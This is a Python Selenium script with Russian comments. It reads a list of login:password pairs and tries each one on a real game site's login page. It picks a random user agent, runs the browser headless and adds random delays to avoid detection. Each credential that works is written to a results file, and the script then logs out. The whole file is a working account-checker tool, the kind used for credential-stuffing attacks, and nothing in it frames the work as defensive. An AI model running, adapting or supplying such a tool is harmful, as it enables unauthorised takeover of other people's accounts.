import random  # для генерации случайных чисел
from selenium import webdriver  # управление браузером
from selenium.webdriver.common.by import By  # поиск элементов HTML 
from selenium.webdriver.support import expected_conditions as EC  # ожидаемые условия
from selenium.webdriver.support.ui import WebDriverWait  # ожидания
import time  # для паузы в действиях


# Список различных пользовательских агентов
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# Выбор случайного пользовательского агента
random_user_agent = random.choice(user_agents)

# Настройки браузера
options = webdriver.ChromeOptions()
options.add_argument(f"user-agent={random_user_agent}")  # Устанавливаем случайный пользовательский агент
options.add_argument("--headless")  # Закомментировать, если нужен видимый браузер

driver = webdriver.Chrome(options=options)  # инициализация браузера с заданными настройками

# Файлы для входа и результатов
input_file = "accounts_check.txt"
output_file = "results.txt"

try:
    # Читаем логины и пароли из файла
    with open(input_file, "r") as file:
        accounts = file.readlines()

    results = []

    # заходим на сайт
    driver.get("https://loliland.net/start")
    time.sleep(random.randint(15, 20))  # Случайная пауза от 15 до 20 секунд

    for account in accounts:
        login, password = account.strip().split(':')  # Разделяем логин и пароль


        # Находим поле логина (по placeholder)
        login_field = driver.find_element(By.XPATH, "//input[@placeholder='Логин']")
        login_field.clear()  # Очищаем поле логина
        login_field.send_keys(login)

        # Находим поле пароля (по placeholder)
        password_field = driver.find_element(By.XPATH, "//input[@placeholder='Пароль']")
        password_field.clear()  # Очищаем поле пароля
        password_field.send_keys(password)

        # Ищем кнопку входа (она внутри <div class="btn-drop">) и кликаем
        login_button = driver.find_element(By.CLASS_NAME, "btn-drop")
        login_button.click()

        time.sleep(random.randint(5, 20))  # Случайная пауза от 5 до 20 секунд

        # Проверяем успешный вход по наличию элемента с классом 'profile_div'
        try:
            profile_div = driver.find_element(By.CLASS_NAME, "profile_div")
            results.append(f"✅ Успешный вход! {login}:{password}")

            # Находим и нажимаем кнопку "Выйти"
            try:
                # Ждем, пока кнопка "Выйти" станет доступной
                WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'button_profile') and contains(text(), 'Выйти')]")))
                logout_button = driver.find_element(By.XPATH, "//div[contains(@class, 'button_profile') and contains(text(), 'Выйти')]")
                logout_button.click()
                time.sleep(random.randint(5, 20))  # Пауза после выхода
            except Exception as e:
                print(f"❌ Не удалось выйти из аккаунта: {e}")

        except Exception as e:
            results.append(f"❌ Ошибка входа! {login}:{password}")

    # Записываем результаты в файл
    with open(output_file, "w") as file:
        for result in results:
            file.write(result + "\n")

finally:
    driver.quit()  # Закрываем браузер
